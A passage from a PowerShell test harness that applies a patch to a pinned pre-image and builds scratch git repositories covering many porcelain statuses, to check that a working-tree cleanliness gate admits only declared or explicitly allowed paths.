# ONE ROUTE. The pinned pre-image fixture plus ONE forward apply. The route that
# stood here (reverse-apply copies of the live tools/ to reach the pre-image, then forward) went with
# the live copies, and so did its second branch for a checkout whose tools/ was the pre-image.
$execDir     = New-PreImageTree (Join-Path $applyDir 'derived-post')
$execFwdExit = Invoke-PatchTransform -PatchFile $patchPath -TreeDir $execDir -Reverse $false
$execRoute   = 'FORWARD from the pinned pre-image fixture -- the only route; no copy of the live tools/ is involved'
$execLib     = Join-Path $execDir 'tools\mission-lib.ps1'
# THE ONE REMAINING LIVE DEPENDENCY OF H-3, disclosed: the admission READER is
# copied from the LIVE tools/lam/ beside the derived gate, because Assert-CleanWorkingTree resolves it
# as $PSScriptRoot\lam\lam-verify-admission.ps1 and the patch does not carry it. It is the environment
# the post-image runs in, not one of the two files the patch changes; $readerReal reads the same file.
New-Item -ItemType Directory -Path (Join-Path $execDir 'tools\lam') -Force | Out-Null
Copy-Item (Join-Path $repoRoot 'tools\lam\lam-verify-admission.ps1') (Join-Path $execDir 'tools\lam\') -Force
$execDerived = ($execFwdExit -eq 0) -and (Test-Path -LiteralPath $execLib)

# CONTROL ON THE DERIVATION, READ OFF THE PATCH ITSELF. The tree that came out of
# the forward apply must be the post-image the patch DECLARES: for each body file, the in-process git
# blob id of the derived file (LF basis -- CRLF pairs collapsed, so the check is about CONTENT and not
# about which EOL `git apply` wrote) must begin with the POST-image id on that file's own `index` line.
# It replaces a byte comparison with the LIVE tools/mission-lib.ps1 -- the coupling the pinned pre-image removed --
# and it covers BOTH derived files where that comparison covered one. A red here means the hunks and
# the index lines disagree (a hand-edited hunk, a drifted fixture), or the wrong file was derived.
$execPostRows = @()
foreach ($bs in $bodySections) {
    $bsDerived = Join-Path $execDir ($bs.Path -replace '/', '\')
    $bsId = ''
    if ($execDerived -and (Test-Path -LiteralPath $bsDerived)) {
        $bsBytes = Get-Wp1LfBytes -Path $bsDerived
        $bsId    = Get-Wp1GitBlobId -Bytes $bsBytes
    }
    $execPostRows += [pscustomobject]@{
        Path     = $bs.Path
        Declared = $bs.Post
        Derived  = $bsId
        Ok       = ($bs.Post.Length -ge 7) -and ($bsId.Length -eq 40) -and $bsId.StartsWith($bs.Post, [System.StringComparison]::Ordinal)
    }
}
$execIsDeclaredPost = $execDerived -and ($execPostRows.Count -eq $preImageRows.Count) -and
                      (@($execPostRows | Where-Object { -not $_.Ok }).Count -eq 0)
$execPostReport = (@($execPostRows | ForEach-Object {
    "        [$($_.Path)]  index line declares post-image $($_.Declared)   derived blob $($_.Derived)   : $($_.Ok)"
}) -join "`r`n")
if ($execPostRows.Count -eq 0) { $execPostReport = '        <no body section parsed>' }

# --- the scratch mission roots -------------------------------------------------------------
# Under $applyDir, which is under .mission-runtime/ (gitignored) and is removed below, so this
# leg leaves nothing in the repository. Names are two characters because a scratch git repo's
# .git/objects/<xx>/<38 chars> is the deepest path any of this creates and MAX_PATH is real on
# this platform; core.longpaths is set INSIDE each throwaway repo, never on this machine.
$a126Decl = "admitted_porcelain:`n  - `"?? .mission/evidence/verify-`"`n"
$a126Mal  = "admitted_porcelain:`n  - `".mission/evidence/verify-`"`n"
# ROUND 5 DECLARATION SHAPES. The declaration is the ONLY thing that can widen this gate, so the
# shapes a mission can put in it are part of the row set: the session- prefix that replaced the
# dropped D9 CODE exemption, a TWO-ENTRY set (the validator named "several entries where only the
# second is widened" as an input no row supplied), NO declaration at all, and the key present with
# nothing parseable under it -- which the library distinguishes from both ABSENT and MALFORMED.
$a126Sess = "admitted_porcelain:`n  - `"?? .mission/evidence/session-`"`n"
$a126Two  = "admitted_porcelain:`n  - `"?? .mission/gates/push-`"`n  - `"?? .mission/evidence/verify-`"`n"
$a126None = ''
$a126Unre = "admitted_porcelain:`n"

function New-A126Root {
    param([string]$Name, [string]$Declaration, [bool]$Anchored, [bool]$BreakGit)
    $dir = Join-Path $applyDir "a126\$Name"
    New-Item -ItemType Directory -Path (Join-Path $dir '.mission') -Force | Out-Null
    [System.IO.File]::WriteAllText((Join-Path $dir '.mission\mission.yaml'),
        "id: WP1-A126-$Name`nstate: Executing`n$Declaration")
    [System.IO.File]::WriteAllText((Join-Path $dir 'README.md'), "scratch`n")
    if ($BreakGit) {
        # A .git FILE pointing nowhere: `git status` exits non-zero AND the discovery walk stops
        # here, so this fixture can never reach the repository this instrument lives in.
        [System.IO.File]::WriteAllText((Join-Path $dir '.git'), "gitdir: ./no-such-git-dir`n")
        return $dir
    }
    if ($Anchored) {
        foreach ($plane in @('.mission\evidence', '.mission\gates')) {
            New-Item -ItemType Directory -Path (Join-Path $dir $plane) -Force | Out-Null
            [System.IO.File]::WriteAllText((Join-Path $dir "$plane\ANCHOR.txt"), "tracked`n")
        }
    }
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        & git init -q $dir 2>&1 | Out-Null
        & git -C $dir config core.longpaths true 2>&1 | Out-Null
        & git -C $dir add -A 2>&1 | Out-Null
        & git -C $dir -c user.email=wp1@scratch -c user.name=wp1 commit -q -m fixture 2>&1 | Out-Null
    } finally { $ErrorActionPreference = $prevEap }
    $dir
}
function Add-A126File {
    param([string]$Root, [string]$RelPath, [string]$Text = "x`n")
    $file = Join-Path $Root $RelPath
    New-Item -ItemType Directory -Path (Split-Path -Parent $file) -Force | Out-Null
    [System.IO.File]::WriteAllText($file, $Text)
}
function Invoke-A126Git {
    # One place that runs git inside a scratch fixture. PS 5.1: under 'Stop' a native exe's stderr
    # is a FATAL NativeCommandError in THIS process, and several of the fixtures below (git rm,
    # a deliberately conflicting merge) write to stderr on a successful run, so the preference is
    # relaxed around the call and restored in finally.
    param([string]$Root, [string[]]$GitArgs)
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try { & git -C $Root @GitArgs 2>&1 | Out-Null } finally { $ErrorActionPreference = $prevEap }
}
function Save-A126Fixture {
    param([string]$Root)
    Invoke-A126Git -Root $Root -GitArgs @('add', '-A')
    Invoke-A126Git -Root $Root -GitArgs @('-c', 'user.email=wp1@scratch', '-c', 'user.name=wp1', 'commit', '-q', '-m', 'track')
}
function Get-A126Branch {
    # READ the trunk branch name, never assume it. init.defaultBranch is this MACHINE's setting and
    # is no part of the contract; a hard-coded 'master' would make the UU fixture emit nothing on a
    # host configured the other way -- F-0 would catch that as a red row, but for the wrong reason.
    param([string]$Root)
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try { $b = (& git -C $Root rev-parse --abbrev-ref HEAD 2>&1 | Select-Object -First 1) }
    finally { $ErrorActionPreference = $prevEap }
    "$b".Trim()
}
function Get-A126Porcelain {
    param([string]$Root)
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $raw  = @(& git -C $Root status --porcelain 2>&1 | ForEach-Object { "$_" })
        $code = $LASTEXITCODE
    } finally { $ErrorActionPreference = $prevEap }
    [pscustomobject]@{ Ok = ($code -eq 0); Lines = @($raw | Where-Object { $_.Trim() }) }
}
function Invoke-A126Gate {
    # The gate refuses through Stop-WithError, which prints on stdout and exits 1. PS 5.1: the
    # child's stderr under 'Stop' would be a fatal NativeCommandError in THIS process, so the
    # preference is relaxed around the call and restored in finally, exactly as H-4 does.
    # -LibPath names a DIFFERENT derived copy. Row k1 needs one that has no lam/ beside it, so
    # that the gate's own "reader absent" branch is reached in the DERIVED code rather than in a
    # stub written here.
    param([string]$Root, [string]$AllowPathsCsv = '', [string]$LibPath = '')
    $useLib = if ($LibPath) { $LibPath } else { $execLib }
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        if ($AllowPathsCsv) {
            $out = & powershell -NoProfile -ExecutionPolicy Bypass -File $a126Drv -Lib $useLib -Root $Root -AllowPathsCsv $AllowPathsCsv 2>&1
        } else {
            $out = & powershell -NoProfile -ExecutionPolicy Bypass -File $a126Drv -Lib $useLib -Root $Root 2>&1
        }
        $code = $LASTEXITCODE
    } finally { $ErrorActionPreference = $prevEap }
    [pscustomobject]@{ Exit = $code; Out = (@($out | ForEach-Object { "$_" }) -join ' ') }
}

$execRows = @()
# THE SCRATCH MISSION ROOTS ARE BUILT FIRST, UNCONDITIONALLY,
# AND ONLY THEN DOES THIS MEMBER'S EXECUTION LEG RUN OVER THEM. Until this session every root was built
# INSIDE the block guarded by a successful derivation, so a derivation that failed -- which is what the
# spec-accept cure did to it -- left NO roots, and nothing could have judged the live gates
# over them. H-16 reuses these roots, so they must exist whatever the derivation did. The declarations
# below are kept as they were: every list a later conjunct reads exists before anything assigns it.
$execSpec            = @()
$sweepSpec           = @()
$sweepIds            = @()
$xyAlphabet          = @()
$xyDriven            = @()
$xyUnreachable       = @()
$alphabetPartitioned = $false
$alphabetReport      = '    <NOT RUN>'
# =============================================================================================
# THE SCRATCH MISSION ROOTS -- built for H-3's execution leg AND for H-16
# =============================================================================================
# a4 is built by hand because it is the only row whose subject must be TRACKED first: a
# declared prefix at a status the declaration does not admit is the work-tree defect's
# status-blindness, and it only exists once the file is in the index.
$rootA4 = New-A126Root 'a4' $a126Decl $true $false
Add-A126File $rootA4 '.mission\evidence\verify-0002\report.json'
$prevEap = $ErrorActionPreference
$ErrorActionPreference = 'Continue'
try {
    & git -C $rootA4 add -A 2>&1 | Out-Null
    & git -C $rootA4 -c user.email=wp1@scratch -c user.name=wp1 commit -q -m track 2>&1 | Out-Null
} finally { $ErrorActionPreference = $prevEap }
Add-A126File $rootA4 '.mission\evidence\verify-0002\report.json' "TAMPERED`n"

$rootA1 = New-A126Root 'a1' $a126Decl $true  $false; Add-A126File $rootA1 '.mission\evidence\verify-0001\report.json'
$rootA2 = New-A126Root 'a2' $a126Decl $true  $false; Add-A126File $rootA2 '.mission\evidence\scratch-oops\leak.txt'
$rootA3 = New-A126Root 'a3' $a126Decl $true  $false; Add-A126File $rootA3 '.mission\gates\push-1.yaml'
$rootA5 = New-A126Root 'a5' $a126Decl $true  $false; Add-A126File $rootA5 'stray.txt'
$rootC1 = New-A126Root 'c1' $a126Decl $false $false; Add-A126File $rootC1 '.mission\evidence\verify-0009\r.json'
$rootC2 = New-A126Root 'c2' $a126Decl $false $false; Add-A126File $rootC2 '.mission\gates\push-9.yaml'
$rootM1 = New-A126Root 'm1' $a126Mal  $true  $false; Add-A126File $rootM1 'stray.txt'
$rootA6 = New-A126Root 'a6' $a126Decl $true  $false; Add-A126File $rootA6 'stray.txt'
$rootN1 = New-A126Root 'n1' $a126Decl $true  $true

# -- ROUND 5 FIXTURES. Every NON-untracked porcelain status against a DECLARED prefix. The
#    library REFUSES any declared entry that does not begin with '?? ' (that is row m1), so a
#    well-formed declaration can only ever admit an UNTRACKED line -- which makes every other
#    status a line the gate must JUDGE, never one it may skip. Row a4 drove ' M ' and nothing
#    drove the rest; the DELETED one was driven straight through this leg at the head of the
#    round.
$rootS1 = New-A126Root 's1' $a126Decl $true $false
Add-A126File $rootS1 '.mission\evidence\verify-0003\report.json'; Save-A126Fixture $rootS1
Remove-Item -LiteralPath (Join-Path $rootS1 '.mission\evidence\verify-0003\report.json') -Force

$rootS2 = New-A126Root 's2' $a126Decl $true $false
Add-A126File $rootS2 '.mission\evidence\verify-0003\report.json'; Save-A126Fixture $rootS2
Invoke-A126Git -Root $rootS2 -GitArgs @('rm', '-q', '-f', '.mission/evidence/verify-0003/report.json')

$rootS3 = New-A126Root 's3' $a126Decl $true $false
Add-A126File $rootS3 '.mission\evidence\verify-0004\report.json'
Invoke-A126Git -Root $rootS3 -GitArgs @('add', '-A')

$rootS4 = New-A126Root 's4' $a126Decl $true $false
Add-A126File $rootS4 '.mission\evidence\verify-0005\report.json'
Invoke-A126Git -Root $rootS4 -GitArgs @('add', '-A')
Add-A126File $rootS4 '.mission\evidence\verify-0005\report.json' "CHANGED`n"

$rootS5 = New-A126Root 's5' $a126Decl $true $false
Add-A126File $rootS5 '.mission\evidence\verify-0006\old.json' "a payload long enough for git to score this as a rename`n"
Save-A126Fixture $rootS5
Invoke-A126Git -Root $rootS5 -GitArgs @('mv', '.mission/evidence/verify-0006/old.json', '.mission/evidence/verify-0006/new.json')

$rootS6 = New-A126Root 's6' $a126Decl $true $false
Add-A126File $rootS6 '.mission\evidence\verify-0007\report.json'; Save-A126Fixture $rootS6
Add-A126File $rootS6 '.mission\evidence\verify-0007\report.json' "STAGED`n"
Invoke-A126Git -Root $rootS6 -GitArgs @('add', '-A')
Add-A126File $rootS6 '.mission\evidence\verify-0007\report.json' "AGAIN`n"

# UU needs a REAL merge conflict, not a hand-written index.
$rootS7 = New-A126Root 's7' $a126Decl $true $false
Add-A126File $rootS7 '.mission\evidence\verify-0008\report.json' "base`n"; Save-A126Fixture $rootS7
$s7Trunk = Get-A126Branch -Root $rootS7
Invoke-A126Git -Root $rootS7 -GitArgs @('checkout', '-q', '-b', 'side')
Add-A126File $rootS7 '.mission\evidence\verify-0008\report.json' "side`n"; Save-A126Fixture $rootS7
Invoke-A126Git -Root $rootS7 -GitArgs @('checkout', '-q', $s7Trunk)
Add-A126File $rootS7 '.mission\evidence\verify-0008\report.json' "trunk`n"; Save-A126Fixture $rootS7
Invoke-A126Git -Root $rootS7 -GitArgs @('-c', 'user.email=wp1@scratch', '-c', 'user.name=wp1', 'merge', 'side')

# -- NO declaration at all -> ADMIT NOTHING. This is the cure block's own capitalised law and
#    it had NO row; a two-line fail-open planted at the judgment site drove the whole ten-row
#    leg green. Two spellings (an ordinary stray, and a path the verify- declaration WOULD
#    have admitted) plus the control that shows the refusal is not unconditional.
$rootD1 = New-A126Root 'd1' $a126None $true $false; Add-A126File $rootD1 'stray.txt'
$rootD2 = New-A126Root 'd2' $a126None $true $false; Add-A126File $rootD2 '.mission\evidence\verify-0011\r.json'
$rootD3 = New-A126Root 'd3' $a126None $true $false; Add-A126File $rootD3 'stray.txt'
# -- the key PRESENT with nothing parseable under it is UNREADABLE: a third degradation the
#    library distinguishes from MALFORMED (m1) and from ABSENT (d1/d2), and the one amendment
#    5 exists over.
$rootU1 = New-A126Root 'u1' $a126Unre $true $false; Add-A126File $rootU1 'stray.txt'
# -- the D9 `session-` exemption was dropped from CODE and the block says the DECLARATION
#    satisfies its premise instead. Both halves: declared -> admitted, undeclared -> refused.
$rootG1 = New-A126Root 'g1' $a126Sess $true $false; Add-A126File $rootG1 '.mission\evidence\session-abc\r.json'
$rootG2 = New-A126Root 'g2' $a126Decl $true $false; Add-A126File $rootG2 '.mission\evidence\session-abc\r.json'
# -- a TWO-ENTRY declaration, which the validator named as an input no row supplied. x1 admits
#    on the SECOND entry (so a reader that stops at the first is red); x2 is inside the FIRST
#    entry's plane but outside its prefix, so a widened entry is red.
$rootX1 = New-A126Root 'x1' $a126Two $true $false; Add-A126File $rootX1 '.mission\evidence\verify-0012\r.json'
$rootX2 = New-A126Root 'x2' $a126Two $true $false; Add-A126File $rootX2 '.mission\gates\other-1.yaml'
# -- a genuinely CLEAN tree is the gate's early return, and nothing drove it.
#    ROUND 6 FINDING: t1 ALONE COULD NOT TELL THE DIFFERENCE. The claim mapped to it was
#    "a clean tree passes on the early return, BEFORE ANY DECLARATION IS READ", and t1 is built
#    WITH a valid declaration -- so a gate that read the declaration and happened to find it
#    fine would pass t1 exactly as one that never read it does. READ THE CODE rather than
#    asserting the slogan: the early return `if ($lines.Count -eq 0) { Write-Pass ...; return }`
#    stands AFTER the reader library is located and the porcelain is taken, and BEFORE
#    Get-LamDeclaredAdmittedPorcelain is called at all. So what is actually true is that a clean
#    tree passes with a MALFORMED declaration (t2) and with NO declaration at all (t3) -- both
#    of which REFUSE the moment there is one porcelain line (m1, d1), which is what makes t2/t3
#    discriminating rather than vacuous. The claim is reworded to exactly that in the table.
$rootT1 = New-A126Root 't1' $a126Decl $true $false
$rootT2 = New-A126Root 't2' $a126Mal  $true $false
$rootT3 = New-A126Root 't3' $a126None $true $false
# -- $AllowPaths exempts ONLY its named inputs AND STILL REFUSES genuine stray state. a6 drove
#    the first half only.
$rootP1 = New-A126Root 'p1' $a126Decl $true $false
Add-A126File $rootP1 'stray.txt'; Add-A126File $rootP1 'other.txt'
# -- git QUOTES a porcelain path containing a space; the gate strips the quotes and normalises
#    separators before matching $AllowPaths. Neither was driven.
$rootQ1 = New-A126Root 'q1' $a126Decl $true $false; Add-A126File $rootQ1 'my file.txt'
# -- the reader library ABSENT beside the gate under test: the gate's FIRST and most explicit
#    fail-closed branch, and it had no row. The ROOT is ordinary; what makes k1 the reader-absent row
#    is the mission-lib each leg runs it through -- H-3 a SECOND copy of the DERIVED file with no lam/
#    beside it (so it measures the derived code and not a stub), H-16 a copy of the LIVE file placed
#    alone. So the row carries NoReader = $true rather than a library path: the roots are built
#    before either library exists.
$rootK1 = New-A126Root 'k1' $a126Decl $true $false; Add-A126File $rootK1 'stray.txt'

# Each row: the exact porcelain the fixture must emit (F-0), the verdict the DECLARATION
# demands, and a substring of the refusal that ties the verdict to the right line. The three
# surviving refutations all turn a REFUSED row into an ADMITTED one, so it is the REFUSED
# rows that bind; the ADMITTED row is what stops a gate that refuses everything from passing.
$execSpec = @(
    @{ Name = 'a1 declared "?? .mission/evidence/verify-" prefix -> ADMITTED, and $AllowPaths DEFAULTS EMPTY'
       Root = $rootA1; Porc = @('?? .mission/evidence/verify-0001/'); Exit = 0
       Says = 'porcelain line(s) admitted by the mission''s declared set'
       NotSays = 'sanctioned input(s)' }
    @{ Name = 'a2 untracked store INSIDE the evidence plane, OUTSIDE the declared prefix -> REFUSED'
       Root = $rootA2; Porc = @('?? .mission/evidence/scratch-oops/'); Exit = 1
       Says = 'scratch-oops' }
    @{ Name = 'a3 untracked file under .mission/gates/, mission declares only verify- -> REFUSED'
       Root = $rootA3; Porc = @('?? .mission/gates/push-1.yaml'); Exit = 1
       Says = '.mission/gates/push-1.yaml' }
    @{ Name = 'a4 DECLARED prefix at a NON-untracked status (status-blindness) -> REFUSED'
       Root = $rootA4; Porc = @(' M .mission/evidence/verify-0002/report.json'); Exit = 1
       Says = 'verify-0002/report.json' }
    @{ Name = 'a5 an ordinary stray outside both planes -> REFUSED'
       Root = $rootA5; Porc = @('?? stray.txt'); Exit = 1
       Says = 'stray.txt' }
    @{ Name = 'c1 WHOLLY-untracked evidence plane, collapsed by git to one line -> REFUSED'
       Root = $rootC1; Porc = @('?? .mission/evidence/'); Exit = 1
       Says = '.mission/evidence/' }
    @{ Name = 'c2 WHOLLY-untracked gates plane, collapsed by git to one line -> REFUSED'
       Root = $rootC2; Porc = @('?? .mission/gates/'); Exit = 1
       Says = '.mission/gates/' }
    @{ Name = 'm1 MALFORMED declaration -> REFUSED, not a fallback'
       Root = $rootM1; Porc = @('?? stray.txt'); Exit = 1
       Says = 'MALFORMED admitted_porcelain declaration' }
    @{ Name = 'a6 -AllowPaths still exempts exactly its NAMED inputs (control for a1''s negative)'
       Root = $rootA6; Porc = @('?? stray.txt'); Exit = 0; Allow = 'stray.txt'
       Says = 'sanctioned input(s): stray.txt' }
    @{ Name = 'n1 FAILING git status (fail-open) -> REFUSED'
       Root = $rootN1; Porc = $null; Exit = 1
       Says = 'could not be derived' }
    @{ Name = 's1 DECLARED prefix, tracked file DELETED IN THE WORKTREE ( D ) -> REFUSED'
       Root = $rootS1; Porc = @(' D .mission/evidence/verify-0003/report.json'); Exit = 1
       Says = ' D .mission/evidence/verify-0003/report.json'
       Says2 = 'declared by the mission at' }
    @{ Name = 's2 DECLARED prefix, tracked file DELETED IN THE INDEX (D , git rm) -> REFUSED'
       Root = $rootS2; Porc = @('D  .mission/evidence/verify-0003/report.json'); Exit = 1
       Says = 'D  .mission/evidence/verify-0003/report.json' }
    @{ Name = 's3 DECLARED prefix, new file ADDED TO THE INDEX (A ) -> REFUSED'
       Root = $rootS3; Porc = @('A  .mission/evidence/verify-0004/report.json'); Exit = 1
       Says = 'A  .mission/evidence/verify-0004/report.json' }
    @{ Name = 's4 DECLARED prefix, INDEX-ADDED then WORKTREE-MODIFIED (AM) -> REFUSED'
       Root = $rootS4; Porc = @('AM .mission/evidence/verify-0005/report.json'); Exit = 1
       Says = 'AM .mission/evidence/verify-0005/report.json' }
    @{ Name = 's5 DECLARED prefix, staged RENAME (R  old -> new) -> REFUSED, whole rename line named'
       Root = $rootS5; Porc = @('R  .mission/evidence/verify-0006/old.json -> .mission/evidence/verify-0006/new.json'); Exit = 1
       Says = '.mission/evidence/verify-0006/old.json -> .mission/evidence/verify-0006/new.json' }
    @{ Name = 'r1 the SAME rename line with the DESTINATION named in -AllowPaths -> ADMITTED'
       Root = $rootS5; Porc = @('R  .mission/evidence/verify-0006/old.json -> .mission/evidence/verify-0006/new.json'); Exit = 0
       Allow = '.mission/evidence/verify-0006/new.json'
       Says = 'sanctioned input(s): .mission/evidence/verify-0006/new.json' }
    @{ Name = 's6 DECLARED prefix, INDEX-MODIFIED then WORKTREE-MODIFIED (MM) -> REFUSED'
       Root = $rootS6; Porc = @('MM .mission/evidence/verify-0007/report.json'); Exit = 1
       Says = 'MM .mission/evidence/verify-0007/report.json' }
    @{ Name = 's7 DECLARED prefix, UNMERGED (UU) -> REFUSED'
       Root = $rootS7; Porc = @('UU .mission/evidence/verify-0008/report.json'); Exit = 1
       Says = 'UU .mission/evidence/verify-0008/report.json' }
    @{ Name = 'd1 mission declares NO admitted_porcelain AT ALL, one stray -> REFUSED, ADMITTING NOTHING'
       Root = $rootD1; Porc = @('?? stray.txt'); Exit = 1
       Says = 'NONE -- this mission declares no admitted_porcelain'
       Says2 = "entry to admitted_porcelain in the mission's own mission.yaml" }
    @{ Name = 'd2 NO declaration, and a path the verify- declaration WOULD have admitted -> REFUSED'
       Root = $rootD2; Porc = @('?? .mission/evidence/verify-0011/'); Exit = 1
       Says = '?? .mission/evidence/verify-0011/' }
    @{ Name = 'd3 NO declaration + the one stray NAMED in -AllowPaths -> ADMITTED (only -AllowPaths exempts)'
       Root = $rootD3; Porc = @('?? stray.txt'); Exit = 0; Allow = 'stray.txt'
       Says = 'sanctioned input(s): stray.txt' }
    @{ Name = 'u1 admitted_porcelain PRESENT but with no parseable entry -> REFUSED as UNREADABLE, not as absent'
       Root = $rootU1; Porc = @('?? stray.txt'); Exit = 1
       Says = 'UNREADABLE admitted_porcelain declaration' }
    @{ Name = 'g1 a DECLARED "?? .mission/evidence/session-" prefix -> ADMITTED (what replaces the dropped D9 code exemption)'
       Root = $rootG1; Porc = @('?? .mission/evidence/session-abc/'); Exit = 0
       Says = 'porcelain line(s) admitted by the mission''s declared set'
       NotSays = 'sanctioned input(s)' }
    @{ Name = 'g2 the SAME session- directory with only the verify- declaration -> REFUSED (the D9 CODE exemption is gone)'
       Root = $rootG2; Porc = @('?? .mission/evidence/session-abc/'); Exit = 1
       Says = '?? .mission/evidence/session-abc/' }
    @{ Name = 'x1 a TWO-ENTRY declaration, admitted on the SECOND entry -> ADMITTED'
       Root = $rootX1; Porc = @('?? .mission/evidence/verify-0012/'); Exit = 0
       Says = 'porcelain line(s) admitted by the mission''s declared set' }
    @{ Name = 'x2 the SAME two-entry declaration, inside the first entry''s plane but outside its prefix -> REFUSED'
       Root = $rootX2; Porc = @('?? .mission/gates/other-1.yaml'); Exit = 1
       Says = '?? .mission/gates/other-1.yaml' }
    @{ Name = 't1 a genuinely CLEAN tree, VALID declaration -> PASS on the early return'
       Root = $rootT1; Porc = @(); Exit = 0
       Says = 'Working tree clean.'
       NotSays = 'admitted by' }
    @{ Name = 't2 a CLEAN tree with a MALFORMED declaration -> STILL PASSES: the early return stands BEFORE the declaration is read (m1 is the same declaration with one porcelain line, and REFUSES)'
       Root = $rootT2; Porc = @(); Exit = 0
       Says = 'Working tree clean.'
       NotSays = 'MALFORMED' }
    @{ Name = 't3 a CLEAN tree with NO declaration at all -> STILL PASSES on the early return (d1 is the same mission with one porcelain line, and REFUSES)'
       Root = $rootT3; Porc = @(); Exit = 0
       Says = 'Working tree clean.'
       NotSays = 'no admitted_porcelain' }
    @{ Name = 'p1 -AllowPaths names ONE stray while ANOTHER remains -> REFUSED, naming only the unnamed one'
       Root = $rootP1; Porc = @('?? other.txt', '?? stray.txt'); Exit = 1; Allow = 'stray.txt'
       Says = '?? other.txt'
       NotSays = 'stray.txt' }
    @{ Name = 'q1 a QUOTED porcelain path with a space, named UNQUOTED in -AllowPaths -> ADMITTED'
       Root = $rootQ1; Porc = @('?? "my file.txt"'); Exit = 0; Allow = 'my file.txt'
       Says = 'sanctioned input(s): my file.txt' }
    @{ Name = 'k1 the admitted-porcelain READER absent beside the derived mission-lib -> REFUSED'
       Root = $rootK1; Porc = @('?? stray.txt'); Exit = 1; NoReader = $true
       Says = 'the admitted-porcelain reader is absent at' }
)

# =========================================================================================
# ROUND 6 -- THE STATUS ROW SET IS DERIVED FROM GIT'S OWN ALPHABET, NOT ENUMERATED BY HAND.
# =========================================================================================
# WHY. Round 5's answer to "which statuses are judged?" was a list of seven shapes somebody
# thought of, while the checked claim beside it said "every non-untracked status against a
# declared prefix". A fresh-context validator drove ONE line --
#     if ([regex]::IsMatch($line, '^M ')) { $tolerated++; continue }
# planted in BOTH tools/mission-lib.ps1 and the patch post-image (hunk header +94,174 ->
# +94,175) -- and admitted `M  notes.txt`: a TRACKED, UNDECLARED file modified AND STAGED,
# which is the single commonest form of uncommitted drift A-126 exists to refuse. RE-DRIVEN
# HERE at the head of this round before a line was changed and reproduced exactly: WP-1 all 22
# checks passed, EXIT 0, H-3 [PASS], the binding conjunct True, all 30 rows green, and the
# secondary net blind as disclosed (found 4 write site(s), found 6 test site(s), unchanged).
# Eleven further XY combinations were equally unsupplied. Round 3 was a blacklist over
# spellings; round 4 a blacklist over ten inputs; round 5 a blacklist over nine statuses
# ASSERTED AS A SWEEP. A hand-extended row list cannot stop being one.
#
# SO THE ALPHABET IS DERIVED. git-status(1) "Output / Short Format" documents the XY codes as
# FAMILIES -- an X-set crossed with a Y-set -- plus one fixed list of unmerged pairs. Those
# families are transcribed ONCE below and EXPANDED here, so the set swept is git's own and a
# combination nobody here thought of is in it BY CONSTRUCTION. Every code in that alphabet must
# then be in EXACTLY ONE of two places and the member is red otherwise:
#   DRIVEN        -- a fixture produces it under the DECLARED verify- prefix and the gate must
#                    REFUSE, naming the line. A recipe's claimed codes are CHECKED against the
#                    porcelain it really emitted, so a recipe cannot claim a shape it does not
#                    produce.
#   UNREACHABLE   -- no scratch repository on this host can produce it, WITH THE MEASUREMENT
#                    that says so. The claim in the table is then SCOPED to the driven set and
#                    the scope is PRINTED, not left in a comment.
# A code in neither list is RED. That is the deliberate way a newly-documented shape registers.
$xyFamilies = @(
    @{ Why = 'index x work-tree states: X in " MTARC", Y in " MTD" ("  " is a clean file and emits no line)'
       X   = @(' ', 'M', 'T', 'A', 'R', 'C'); Y = @(' ', 'M', 'T', 'D') }
    @{ Why = 'not updated in the index, added with intent-to-add: X " ", Y "A"'
       X   = @(' '); Y = @('A') }
    @{ Why = 'renamed / copied IN THE WORK TREE: X " ", Y in "RC"'
       X   = @(' '); Y = @('R', 'C') }
    @{ Why = 'deleted from the index: X "D", Y " "'
       X   = @('D'); Y = @(' ') }
)
# The unmerged block is a fixed pair list in the same table, not a cross product.
$xyUnmerged = @('DD', 'AU', 'UD', 'UA', 'DU', 'AA', 'UU')
foreach ($fam in $xyFamilies) {
    foreach ($xc in $fam.X) {
        foreach ($yc in $fam.Y) {
            $code = "$xc$yc"
            if ($code -ceq '  ') { continue }
            if ($xyAlphabet -cnotcontains $code) { $xyAlphabet += $code }
        }
    }
}
foreach ($code in $xyUnmerged) { if ($xyAlphabet -cnotcontains $code) { $xyAlphabet += $code } }
# "??" (untracked) and "!!" (ignored) are the other two rows of that table and are OUT of this
# alphabet on purpose: untracked is the only status a declaration can admit and is driven by
# a1/a2/a3/c1/c2/g1/g2/x1/x2/d1/d2 above, and ignored never reaches the gate because
# Get-LamPorcelainState runs `git status --porcelain=v1` with no --ignored.

$swPath  = '.mission/evidence/verify-0100/report.json'
$swPathW = '.mission\evidence\verify-0100\report.json'
$swAlt   = '.mission/evidence/verify-0100/other.json'
$swAltW  = '.mission\evidence\verify-0100\other.json'
$swSide  = '.mission/evidence/verify-0100/sideName.json'
$swTrunk = '.mission/evidence/verify-0100/trunkName.json'
$swLong  = "a payload long enough for git to score this as a rename`n"

function New-SweepRoot {
    # A scratch mission root carrying the SAME declaration as the rows above
    # ("?? .mission/evidence/verify-"), with the evidence plane ANCHORED so git emits a
    # per-file porcelain line instead of collapsing the wholly-untracked directory.
    # user.email / user.name are written into the fixture's own config so the conflict recipes
    # below can commit without threading -c through every call.
    param([string]$Name)
    $dir = Join-Path $applyDir "sweep\$Name"
    New-Item -ItemType Directory -Path (Join-Path $dir '.mission\evidence\verify-0100') -Force | Out-Null
    [System.IO.File]::WriteAllText((Join-Path $dir '.mission\mission.yaml'),
        "id: WP1-SWEEP-$Name`nstate: Executing`n$a126Decl")
    [System.IO.File]::WriteAllText((Join-Path $dir '.mission\evidence\ANCHOR.txt'), "tracked`n")
    [System.IO.File]::WriteAllText((Join-Path $dir 'README.md'), "scratch`n")
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        & git init -q $dir 2>&1 | Out-Null
        & git -C $dir config core.longpaths true 2>&1 | Out-Null
        & git -C $dir config user.email wp1@scratch 2>&1 | Out-Null
        & git -C $dir config user.name wp1 2>&1 | Out-Null
        & git -C $dir add -A 2>&1 | Out-Null
        & git -C $dir commit -q -m base 2>&1 | Out-Null
    } finally { $ErrorActionPreference = $prevEap }
    $dir
}
function Remove-SweepFile {
    # Verb-Noun on purpose. A two-letter helper named `Rm` was written first and LOST to the
    # Remove-Item alias, silently deleting nothing and turning four recipes into the wrong
    # shape -- this repository's one-letter-function trap, hit again while probing this sweep.
